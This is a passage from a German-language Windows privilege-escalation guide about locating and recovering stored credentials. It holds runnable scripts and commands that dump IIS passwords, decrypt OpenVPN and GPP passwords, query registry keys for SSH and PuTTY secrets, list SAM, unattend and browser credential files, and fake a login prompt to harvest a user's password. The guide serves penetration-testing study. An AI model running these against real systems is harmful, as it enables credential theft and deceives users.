    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installer werden **mit SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Anmeldedaten)

### Anmeldedaten-Artefakte in Support-Tool-Registrys

Bei einigen älteren Remote-Support-Installationen bleiben passwortbezogene Wertnamen unter festen Anwendungs-Registry-Schlüsseln erhalten. Beispielsweise kennzeichnete `SecurityPasswordAES` von TeamViewer laut [Erklärung des Herstellers zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Wertnamen-Marker ist lediglich ein Hinweis für die Überprüfung: Verifizieren Sie die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie diese Anmeldedaten bewerten. Der Wechsel von einem Remote-Support-Passwort zu einem privilegierteren Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und eine Autorisierung für dieses Konto besteht. Geben Sie Chiffretext und wiederhergestellte Passwörter nicht in routinemäßigen Enumeration-Ausgaben aus.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn der Verdacht besteht, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und Arbeitsblattschutz oder ausgeblendeten Spalten. [Microsoft erklärt](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung einschränkt und keine Sicherheitsfunktion ist; er belegt für sich genommen nicht, dass der Inhalt der Arbeitsmappe verschlüsselt ist. Überprüfen Sie nur autorisierte, relevante Dateien und geben Sie bei einer breiten Enumeration keine möglichen Geheimnisse aus. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Anmeldedaten vorhanden sind, noch, dass ein Konto höhere Berechtigungen besitzt; verifizieren Sie die tatsächlichen Daten und die aktuellen Kontoberechtigungen separat.

### Von CI-Servern gespeicherte Change-Patches

Ein CI-Server kann eingereichte Quellcodeänderungen in seinem Datenverzeichnis behalten, auch nachdem der Build abgeschlossen ist. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Remote-Run-Änderungen; das Datenverzeichnis kann konfiguriert werden und befindet sich nicht zwingend unter `ProgramData`. Ein lesbarer Patch kann Verweise auf eine Anmeldedatendatei, einen Verschlüsselungsschlüssel oder ein Skript, das beides verwendet, enthalten, auch wenn diese entfernt oder hinzugefügt wurden. Beispielsweise benötigt ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` sowohl den AES-Schlüssel als auch die verschlüsselte Zeichenfolge; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat übergeben wird. Überprüfen Sie zunächst nur die Namen zugänglicher Patches und untersuchen Sie anschließend unter entsprechender Autorisierung relevante Inhalte, ohne Geheimnisse in routinemäßigen Enumeration-Ausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Anmeldedaten noch Zugriff mit höheren Berechtigungen. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen zu committen.

### Benutzerdefinierte Rotation lokaler Administratorpasswörter

Ein selbst entwickelter Passwort-Rotator kann ein verschlüsseltes lokales Administratorpasswort in einem lokalen Dienst speichern, während dessen Datenspeicher-Anmeldedaten in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei liegen. Überprüfen Sie gemeinsam den geplanten Task des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen des Datenspeichers. Ein nur an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Anmeldedaten weiterhin erreichbar, aber die Authentifizierung allein beweist nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Wenn das Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, überprüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mithilfe von Go-[`math/rand`](https://pkg.go.dev/math/rand) ableitet, eignet sich nicht zum Schutz dieses Passworts; Go weist darauf hin, dass dieses Paket für sicherheitskritische Zufallswerte ungeeignet ist. Vergewissern Sie sich, dass jedes wiederhergestellte Passwort aktuell ist und zu einem Konto der lokalen Administratorengruppe gehört, bevor Sie es als möglichen Privilegieneskalationspfad behandeln. Ein geplanter Task, ein `.env`-Pfad oder ein verschlüsselter Datenblock allein belegt keine dieser Voraussetzungen. Geben Sie Passwörter und Schlüsselmaterial nicht in routinemäßigen Enumeration-Ausgaben aus.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorpasswörter. Die Verzeichnis- oder Entra-basierte Speicherung und Zugriffskontrolle unterscheidet sich von einem benutzerdefinierten lokalen Datenspeicher; auch [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) legen fest, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen kann.

### Java-Server-Plugin-Archive und Wiederverwendung von Anmeldedaten

Einige Java-Server-Plugins werden als JAR-Archive im `plugins`-Verzeichnis eines Servers verteilt. Ein lesbares benutzerdefiniertes Plugin kann Konfigurationen oder Bytecode mit eingebetteten Dienst-Anmeldedaten enthalten. Überprüfen Sie das Archiv nur mit entsprechender Autorisierung und geben Sie wiederhergestellte Geheimnisse nicht in routinemäßigen Enumeration-Ausgaben aus. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist, und ein wiederhergestelltes Dienstpasswort führt nur dann zu höheren Berechtigungen, wenn es auch für ein privilegierteres Konto gültig ist. Überprüfen Sie die relevanten Datei-ACLs und ersetzen Sie wiederverwendete Anmeldedaten durch separate Geheimnisse. Siehe [PaperMCs Anleitung zur Plugin-Installation](https://docs.papermc.io/paper/adding-plugins/) zum Verzeichnislayout und [Oracles JAR-Dokumentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) zu Archivinhalten.

### Anmeldedaten in der eingebetteten Openfire-Datenbank

Eine Openfire-Installation, die die eingebettete Datenbank verwendet, kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, überprüfen Sie gemeinsam die `OFUSER`-Datensätze und die Eigenschaft `passwordKey`. Laut Openfires [Dokumentation zum Benutzeranbieter](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Passwörter als Klartext oder mit einem in dieser Eigenschaft gespeicherten Schlüssel verschlüsselt abgelegt werden. Ein wiederhergestelltes Passwort ist für eine Privilegieneskalation nur relevant, wenn es weiterhin für eine privilegiertere Identität gültig ist; der Dateiname allein belegt weder Lesezugriff noch die Wiederverwendung von Anmeldedaten. Der Pfad dient als Hinweis für die Bestandsaufnahme. Geben Sie Datenbankinhalte und Anmeldedaten nicht in routinemäßigen Enumeration-Ausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Administrationskonsole offenlegen, selbst wenn eine externe Datenbank verwendet wird. Openfire bindet seine Administrationskonsole häufig an Loopback; ein lokales Konto kann diese Adresse dennoch erreichen, sofern der Listener läuft. Überprüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Admin-Rolle, die Richtlinie für Plugin-Uploads und die Openfire-Dienstidentität. Ein Administrator, der ein Plugin installieren kann, kann bewirken, dass Plugin-Code im Kontext des Dienstes ausgeführt wird. Das kann hoch privilegiert sein, wenn der Dienst als LocalSystem läuft. Ein passendes Kontopasswort oder ein lesbarer Konfigurationspfad allein belegt weder den Zugriff auf die Administrationskonsole noch die Codeausführung. Siehe die [Anleitung des Herstellers zu Installation und Plugin-Verwaltung](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration eines forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen, üblicherweise `server.config.yaml` genannt, können den `CA.private_key` der internen CA enthalten. Kann ein Benutzer mit geringeren Berechtigungen diesen Schlüssel lesen, kann er möglicherweise ein API-Clientzertifikat ausstellen. Ob dies zu höheren Berechtigungen führt, hängt von den Benutzerrollen des Servers, der API-Erreichbarkeit und der Identität ab, unter der der Server oder der Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält anderes Material; ihr Fund belegt keinen Zugriff auf die Server-CA. Bei einigen Bereitstellungen wird der private CA-Schlüssel offline aufbewahrt, sodass eine lesbare Serverkonfiguration den Signaturschlüssel möglicherweise ebenfalls nicht enthält.

Überprüfen Sie auf einem Windows-Server die ACL der **Server**konfiguration im Installationsverzeichnis sowie etwaiger geschützter Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; weicht der konfigurierte Dienstpfad davon ab, verwenden Sie diesen. Vergewissern Sie sich, dass die aktuelle Identität die Datei lesen kann und `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Enumeration-Ausgaben aus. Der Workflow `config api_client` des Herstellers verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; zusätzlich ist jedoch eine wirksame serverseitige Rolle erforderlich. Deren Erstellung oder Änderung kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine vorhandene privilegierte Serveridentität kann einen möglichen Pfad bieten, auch wenn diese Schreibvorgänge nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im entsprechenden Server- oder Agentenkontext, der hoch privilegiert sein kann.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signaturschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen und Listener-Zugriffe. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY-Anmeldedaten

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während ein exportiertes Sitzungs-Backup `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. [SolarWinds’ Exportanleitung](https://thwack.solarwinds.com/discussion/comment/115591) besagt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; das [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) nennt den nativen Speicherort. Prüfe zuerst Dateiberechtigungen und Pfade. Das Auffinden einer dieser Dateien verrät weder das Passwort noch belegt es, dass gespeicherte Anmeldedaten noch gültig sind oder höhere Berechtigungen besitzen.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-private Schlüssel können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, lässt sich aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsseln.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht läuft und du möchtest, dass er beim Booten automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH an einem Rechner anzumelden. Die Registrierung HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und procmon hat bei der Authentifizierung mit asymmetrischen Schlüsseln keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können auch offline-`SAM`-, `SECURITY`- und `SYSTEM`-Hives enthalten. Prüfen Sie zuerst lokal zugängliche Backup- oder Imageverzeichnisse und sehen Sie sich die **Mitgliedsnamen** eines Images an, bevor Sie etwas extrahieren. Ein `.wim`-Dateiname allein beweist nicht, dass Hives enthalten sind; übliche `install.wim`-, `boot.wim`- und Wiederherstellungsimages sind häufige Fehlalarme. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn sie im Scope liegt. Siehe Microsofts [Leitfaden zu Windows-Images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und die [Referenz zu Registry-Hive-Dateien](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Zugangsdaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Rechnern eingerichtet werden konnten. Diese Methode wies jedoch erhebliche Sicherheitslücken auf. Erstens waren die als XML-Dateien in SYSVOL gespeicherten Group Policy Objects (GPOs) für jeden Domänenbenutzer zugänglich. Zweitens konnten die mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselten Passwörter in diesen GPPs von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein erhebliches Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien mit einem nicht leeren Feld „cpassword“ durchsucht. Findet sie eine solche Datei, entschlüsselt sie das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und unterstützt so die Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder unter _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec verwenden, um die Passwörter zu erhalten:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem ausgelieferten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du es als Sicherheitslücke einstufst. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Kandidat. Eine schnelle lokale Bestandsaufnahme kann Dateinamen und Größen auflisten, ohne Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ein Archivname belegt weder, dass das Archiv ein Geheimnis enthält, noch, dass ein wiederhergestellter Zugang höher privilegierte Rechte gewährt.

### OpenVPN-Anmeldedaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den Benutzer immer **bitten, seine Zugangsdaten oder sogar die Zugangsdaten eines anderen Benutzers einzugeben**, wenn du glaubst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen, die Zugangsdaten enthalten**

Bekannte Dateien, die vor einiger Zeit **Passwörter** im **Klartext** oder als **Base64** enthielten

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Dateinamenlisten-Variante ohne die Password-Safe-Erweiterung

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe-v3-Datenbanken verwenden häufig die Erweiterung `.psafe3`. Behandle eine Datei mit passendem Namen als möglichen verschlüsselten Tresor; ihr Vorhandensein belegt nicht, dass du sie lesen, entsperren oder darin gespeicherte Zugangsdaten verwenden kannst. Prüfe bei der Untersuchung, wo solche Dateien gespeichert sind, zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls nur ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren benötigst du das tatsächliche Master-Passwort sowie alle konfigurierten Schlüsseldateien oder Kontofaktoren. Falls eine autorisierte Überprüfung ein LM:NT-Hashpaar in einem Eintrag findet, überprüfe das angegebene Konto sowie, ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag gewährt für sich genommen keine Administrator- oder SYSTEM-Rechte; auch der Remote-Dienstzugriff, die Kontorechte und jeder separate Schritt zur Dienstausführung müssen gegeben sein. Bei der Bestandsaufnahme sollten der Pfad und die Lesbarkeit des Tresors erfasst werden, nicht die Datenbank oder die gespeicherten Zugangsdaten ausgegeben werden.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Suchbefehlsvariante ohne die Password Safe-Erweiterung

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
